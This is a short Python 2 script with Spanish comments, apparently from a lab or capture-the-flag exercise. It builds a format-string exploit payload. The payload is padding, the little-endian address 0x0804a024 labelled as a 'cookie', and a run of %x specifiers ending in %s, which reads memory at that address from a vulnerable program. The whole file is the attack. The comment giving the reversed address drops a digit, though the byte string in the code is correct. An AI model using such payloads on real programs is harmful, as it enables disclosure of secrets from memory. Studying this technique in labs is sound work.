#payload

#Direccion de cookie:   0804a024
#Direccion de cookie al reves:  24a0048
output = "A" * 4 + "\x24\xa0\x04\x08" + "%x %x %x %x %s"
print output